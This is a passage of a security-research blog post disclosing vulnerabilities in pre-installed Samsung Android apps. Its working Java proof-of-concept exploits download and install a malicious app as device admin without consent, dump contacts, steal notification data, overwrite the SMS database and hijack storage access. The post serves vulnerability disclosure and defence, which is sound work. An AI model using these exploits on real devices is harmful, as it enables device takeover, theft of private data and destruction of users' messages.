               <span class="o">}</span>
           <span class="o">}</span>
       <span class="o">}</span>
   <span class="o">}).</span><span class="na">start</span><span class="o">();</span>
<span class="o">}</span>
</code></pre></div></div>
<p>The PoC works as follows:</p>

<ol>
  <li>
    <p>A service is launched to copy the required file to a public location (since this is an invalid APK file, it will be deleted immediately after an installation error),</p>
  </li>
  <li>
    <p>Then, the <code class="highlighter-rouge">client_downloaded_knox_app.apk</code> file is read.</p>
  </li>
</ol>

<p><strong>Note:</strong> We use <code class="highlighter-rouge">MediaStore.Files</code> because the latest Android versions do not allow direct reading from external storages belonging to other apps, but this can be bypassed using the Android Media Content Provider.</p>

<p class="heading-anchor"><a href="#the-vulnerability-in-managed-provisioning">The vulnerability in Managed Provisioning</a></p>
<p>Managed Provisioning is a pre-installed app on all Samsung devices and is used for corporate device customization.</p>

<p>Once again, while testing Managed Provisioning, we found a vulnerability on installing an app from a public directory:
<img class="post-template__vulnearbility-image" src="/assets/images/ManagedProvisioning.png" alt="vulnerability" /></p>

<p>The original app was developed by AOSP and it had security checks to verify the authorization of any interactions. The Managed Provisioning app was modified by Samsung to add features which were needed to interact with their ecosystem and Knox Core.</p>

<p>Therefore, in the Samsung app, this check could be bypassed by setting the value <code class="highlighter-rouge">com.samsung.knox.container.requestId</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">intExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getIntExtra</span><span class="o">(</span><span class="s">"com.samsung.knox.container.requestId"</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(</span><span class="n">intExtra</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
   <span class="n">ProvisionLogger</span><span class="o">.</span><span class="na">logw</span><span class="o">(</span><span class="s">"Skipping verifyActionAndCaller"</span><span class="o">);</span> <span class="c1">// the bypass</span>
<span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">verifyActionAndCaller</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">str</span><span class="o">))</span> <span class="o">{</span>
   <span class="k">return</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>
<p class="heading-anchor"><a href="#proof-of-concept-for-installing-custom-apps-and-giving-them-devi">Proof of Concept for installing custom apps and giving them Device Admin rights</a></p>
<p>This Proof of Concept was built by copying the code of the <code class="highlighter-rouge">ProvisioningParams.Builder</code> class and passing the standard parameters needed to configure Managed Provisioning, which included:</p>

<ul>
  <li>the URL for downloading the app</li>
  <li>the SHA1 hash of the file</li>
  <li>the <a href="https://developer.android.com/guide/topics/admin/device-admin#developing">Device Admin receiver</a> component name</li>
</ul>

<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">byte</span><span class="o">[]</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="s">"5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="n">PackageDownloadInfo</span><span class="o">.</span><span class="na">Builder</span> <span class="n">infoBuiler</span> <span class="o">=</span> <span class="n">PackageDownloadInfo</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">builder</span><span class="o">()</span>
       <span class="o">.</span><span class="na">setLocation</span><span class="o">(</span><span class="s">"https://redacted.s3.amazonaws.com/app-release.apk"</span><span class="o">)</span>
       <span class="o">.</span><span class="na">setPackageChecksum</span><span class="o">(</span><span class="n">hash</span><span class="o">)</span>
       <span class="o">.</span><span class="na">setSignatureChecksum</span><span class="o">(</span><span class="n">hash</span><span class="o">);</span>

<span class="n">ProvisioningParams</span><span class="o">.</span><span class="na">Builder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">ProvisioningParams</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">builder</span><span class="o">()</span>
       <span class="o">.</span><span class="na">setSkipUserConsent</span><span class="o">(</span><span class="kc">true</span><span class="o">)</span>
       <span class="o">.</span><span class="na">setDeviceAdminComponentName</span><span class="o">(</span><span class="k">new</span> <span class="n">ComponentName</span><span class="o">(</span><span class="s">"test.exampleapp"</span><span class="o">,</span> <span class="s">"test.exampleapp.MyReceiver"</span><span class="o">))</span>
       <span class="o">.</span><span class="na">setDeviceAdminPackageName</span><span class="o">(</span><span class="s">"test.exampleapp"</span><span class="o">)</span>
       <span class="o">.</span><span class="na">setProvisioningAction</span><span class="o">(</span><span class="s">"android.app.action.PROVISION_MANAGED_DEVICE"</span><span class="o">)</span>
       <span class="o">.</span><span class="na">setDeviceAdminDownloadInfo</span><span class="o">(</span><span class="n">infoBuiler</span><span class="o">.</span><span class="na">build</span><span class="o">());</span>

<span class="n">ProvisioningParams</span> <span class="n">params</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">();</span>

<span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"com.android.managedprovisioning.action.RESUME_PROVISIONING"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.android.managedprovisioning"</span><span class="o">,</span> <span class="s">"com.android.managedprovisioning.preprovisioning.PreProvisioningActivity"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"provisioningParams"</span><span class="o">,</span> <span class="n">params</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"com.samsung.knox.container.requestId"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"com.samsung.knox.container.configType"</span><span class="o">,</span> <span class="s">"knox-do-basic"</span><span class="o">);</span>
<span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</code></pre></div></div>
<p>After opening the app, this is what happened:</p>
<ol>
  <li>Managed Provisioning was forced to download a malicious app from the attacker-specified link</li>
  <li>The malicious app installed in Step 1 was made a device administrator with an arbitrary set of rights</li>
  <li>A process was initiated which would remove all the other apps installed on the same device.</li>
</ol>

<p>The attack looked like this:</p>
<video style="max-width: 100%; height: 500px" controls="controls" autoplay="">
    <source src="/assets/images/provisioning.mp4" type="video/mp4; codecs=&quot;avc1.42E01E, mp4a.40.2&quot;" />
</video>

<p class="heading-anchor"><a href="#the-vulnerability-in-secure-folder">The vulnerability in Secure Folder</a></p>
<p>Secure Folder is a secure file storage app which is pre-installed on Samsung devices. It has a large set of rights that an attacker could intercept by exploiting the vulnerability found in accessing <a href="https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/">arbitrary* content providers</a>:
<img class="post-template__vulnearbility-image" src="/assets/images/secure_folder.png" alt="vulnerability" /></p>

<p>Once an attacker receives the intent which was sent by them, they would be able to intercept the rights.</p>

<p>As a PoC, we intercepted the rights to read/write contacts:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
   <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

   <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
   <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.knox.securefolder"</span><span class="o">,</span> <span class="s">"com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity"</span><span class="o">);</span>
   <span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span> <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_WRITE_URI_PERMISSION</span><span class="o">);</span>
   <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">ContactsContract</span><span class="o">.</span><span class="na">RawContacts</span><span class="o">.</span><span class="na">CONTENT_URI</span><span class="o">);</span>
   <span class="n">startActivityForResult</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
   <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

   <span class="n">dump</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">());</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kt">void</span> <span class="nf">dump</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
   <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
   <span class="k">if</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">())</span> <span class="o">{</span>
       <span class="k">do</span> <span class="o">{</span>
           <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
           <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnCount</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
               <span class="k">if</span> <span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                   <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">", "</span><span class="o">);</span>
               <span class="o">}</span>
               <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnName</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="s">" = "</span> <span class="o">+</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
           <span class="o">}</span>
           <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
       <span class="o">}</span>
       <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">());</span>
   <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p class="heading-anchor"><a href="#the-vulnerability-in-secsettings">The vulnerability in SecSettings</a></p>
<p>SecSettings is Samsung’s pre-installed settings app.</p>

<p>The vulnerability on reading and writing arbitrary files from UID 1000 (<code class="highlighter-rouge">system</code>) consists of two components:</p>
<ul>
  <li>gaining access to arbitrary* content providers</li>
  <li>exploiting an insecure FileProvider in the <code class="highlighter-rouge">com.sec.imsservice</code> app</li>
</ul>

<p><img class="post-template__vulnearbility-image" src="/assets/images/imsservice.png" alt="vulnerability" /></p>

<p class="markdown-in-single-quotes">This chain is only possible because both apps use the same shared UID specified in their <code class="highlighter-rouge">AndroidManifest.xml</code>: <code class="highlighter-rouge">android:sharedUserId="android.uid.system"</code>. In fact, this setting means that two different apps can share absolutely all resources and have full access to each other’s components. The vulnerability in SecSettings is Google’s. It was reported to the Android VDP. The reward is $2000. We will disclose the details of this issue in the Part 2 article.</p>

<p class="heading-anchor"><a href="#the-vulnerability-in-samsung-dex-system-ui">The vulnerability in Samsung DeX System UI</a></p>
<p>This vulnerability allowed an attacker to steal data from user notifications, which would typically include chat descriptions for Telegram, Google Docs folders, Samsung Email and Gmail inboxes, and information from notifications of other apps.</p>

<p>The attacker could also activate the functionality to create a backup in the world-readable directory on the SD card:
<img class="post-template__vulnearbility-image" src="/assets/images/DeXSystemUI.png" alt="vulnerability" /></p>

<p>Since the file was deleted immediately after creating a backup, we added a functionality to create a backup copy to prevent this.</p>

<p>Proof of Concept:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">final</span> <span class="n">File</span> <span class="n">root</span> <span class="o">=</span> <span class="n">Environment</span><span class="o">.</span><span class="na">getExternalStorageDirectory</span><span class="o">();</span>
<span class="kd">final</span> <span class="n">File</span> <span class="n">policyFile</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">root</span><span class="o">,</span> <span class="s">"notification_policy.xml"</span><span class="o">);</span>
<span class="kd">final</span> <span class="n">File</span> <span class="n">backupCopy</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">root</span><span class="o">,</span> <span class="s">"backup"</span><span class="o">);</span>

<span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.desktopsystemui"</span><span class="o">,</span> <span class="s">"com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"SAVE_PATH"</span><span class="o">,</span> <span class="n">root</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">());</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"SESSION_KEY"</span><span class="o">,</span> <span class="s">"not_empty"</span><span class="o">);</span>
<span class="n">sendBroadcast</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>

<span class="k">new</span> <span class="nf">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
   <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
       <span class="k">if</span><span class="o">(</span><span class="n">policyFile</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
           <span class="k">try</span> <span class="o">{</span>
               <span class="n">InputStream</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">policyFile</span><span class="o">);</span>
               <span class="n">OutputStream</span> <span class="n">o</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">backupCopy</span><span class="o">);</span>
               <span class="n">IOUtils</span><span class="o">.</span><span class="na">copy</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="n">o</span><span class="o">);</span>
               <span class="n">i</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
               <span class="n">o</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
           <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
           <span class="o">}</span>
       <span class="o">}</span>
   <span class="o">}</span>
<span class="o">}).</span><span class="na">start</span><span class="o">();</span>
</code></pre></div></div>
<p class="heading-anchor"><a href="#the-vulnerability-in-telephonyui">The vulnerability in TelephonyUI</a></p>
<p class="markdown-in-single-quotes">The receiver <code class="highlighter-rouge">com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver</code> is exported. It saves files from the URL specified in <code class="highlighter-rouge">photoring_uri</code> to the path specified in <code class="highlighter-rouge">down_file</code>. This was detected by the Oversecured Android scanner:</p>
<p><img class="post-template__vulnearbility-image" src="/assets/images/TelephonyUI.png" alt="vulnerability" /></p>

<p>The only requirement is that the content-type of the server response should be <code class="highlighter-rouge">image/*</code> or <code class="highlighter-rouge">video/*</code>. Therefore, we used the filename <code class="highlighter-rouge">test.mp4</code> and Amazon S3 automatically specified the <code class="highlighter-rouge">video/mp4</code> content type in the response.</p>

<p>Proof of Concept:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">File</span> <span class="n">dbPath</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">getPackageManager</span><span class="o">().</span><span class="na">getApplicationInfo</span><span class="o">(</span><span class="s">"com.android.providers.telephony"</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">dataDir</span><span class="o">,</span> <span class="s">"databases/mmssms.db"</span><span class="o">);</span>

<span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.android.app.telephonyui"</span><span class="o">,</span> <span class="s">"com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"photoring_uri"</span><span class="o">,</span> <span class="s">"https://redacted.s3.amazonaws.com/test.mp4"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"down_file"</span><span class="o">,</span> <span class="n">dbPath</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">());</span>
<span class="n">sendBroadcast</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</code></pre></div></div>
<p>As a result, the file with SMS/MMS messages was overwritten with attacker-controlled content.</p>

<p class="heading-anchor"><a href="#the-vulnerability-in-phototable">The vulnerability in PhotoTable</a></p>
<p>In PhotoTable, we found <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/">intent redirection</a>, which allowed access to content providers to be intercepted:
<img class="post-template__vulnearbility-image" src="/assets/images/PhotoTable.png" alt="vulnerability" /></p>

<p>We used this vulnerability to hijack the rights to access the SD card. Here is the Proof of Concept:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
   <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
   <span class="n">handle</span><span class="o">(</span><span class="n">getIntent</span><span class="o">());</span>
<span class="o">}</span>

<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onNewIntent</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
   <span class="kd">super</span><span class="o">.</span><span class="na">onNewIntent</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
   <span class="n">handle</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
   <span class="k">if</span><span class="o">(</span><span class="s">"evil"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">()))</span> <span class="o">{</span>
       <span class="n">String</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">MediaStore</span><span class="o">.</span><span class="na">Images</span><span class="o">.</span><span class="na">Media</span><span class="o">.</span><span class="na">insertImage</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">(),</span>
               <span class="n">Bitmap</span><span class="o">.</span><span class="na">createBitmap</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="n">Bitmap</span><span class="o">.</span><span class="na">Config</span><span class="o">.</span><span class="na">ARGB_8888</span><span class="o">),</span>
               <span class="s">"Title_1337"</span><span class="o">,</span>
               <span class="s">"Description_1337"</span><span class="o">);</span>
       <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="s">"Result: "</span> <span class="o">+</span> <span class="n">uri</span><span class="o">);</span>
   <span class="o">}</span>
   <span class="k">else</span> <span class="o">{</span>
       <span class="n">Intent</span> <span class="n">next</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">MediaStore</span><span class="o">.</span><span class="na">Images</span><span class="o">.</span><span class="na">Media</span><span class="o">.</span><span class="na">EXTERNAL_CONTENT_URI</span><span class="o">);</span>
       <span class="n">next</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_WRITE_URI_PERMISSION</span><span class="o">);</span>
       <span class="n">next</span><span class="o">.</span><span class="na">setClass</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">getClass</span><span class="o">());</span>

       <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
       <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.android.dreams.phototable"</span><span class="o">,</span> <span class="s">"com.android.dreams.phototable.PermissionsRequestActivity"</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"previous_intent"</span><span class="o">,</span> <span class="n">next</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"permission_list"</span><span class="o">,</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
       <span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
   <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p class="heading-anchor"><a href="#preventing-these-vulnerabilities">Preventing these vulnerabilities</a></p>

<p>It can be extremely helpful to detect these bug early: Oversecured’s mobile app scanner lets users do that, and notifies them about all the vectors mentioned above in the scan report. Contact us <a href="https://oversecured.com/contact-us">here</a>, and we can provide you with a demo to try it out.</p>


                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            <meta property="og:image" content="assets/images/hannah-cover.jpg" />
                            <meta name="twitter:image" content="assets/images/hannah-cover.jpg" />
                            
                                <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="/author/oversecured">oversecured</a></h4>
                                
                                    <p>secure place</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="/author/oversecured">Read More</a>
                        </div>
                    
                
                <!-- /author  -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">
                <div class="post-card-image" style="background-image: url(/assets/images/thirteenth-article.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">
                <header class="post-card-header">
                    

                    <h2 class="post-card-title">Why dynamic code loading could be dangerous for your apps&#58; a Google example</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                        
                        <span class="post-card-author">
                            <a href="/author/oversecured/">oversecured</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/Android-Exploring-vulnerabilities-in-WebResourceResponse/">
                <div class="post-card-image" style="background-image: url(/assets/images/eleventh-article.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/Android-Exploring-vulnerabilities-in-WebResourceResponse/">
                <header class="post-card-header">
                    

                    <h2 class="post-card-title">Android&#58; Exploring vulnerabilities in WebResourceResponse</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                        
                        <span class="post-card-author">
                            <a href="/author/oversecured/">oversecured</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header floating-active">
    <div class="floating-header-logo">
        <a href="/">
            
                <img src="/assets/images/favicon.svg" alt="News, Techniques & Guides icon" />
            
            <span>News, Techniques & Guides</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Two weeks of securing Samsung devices&#58; Part 1</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Two+weeks+of+securing+Samsung+devices%26%2358%3B+Part+1&amp;url=https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>

        </a>
    </div>
    <progress class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright">
                    <a href="/">Oversecured</a> &copy; 2021 ·
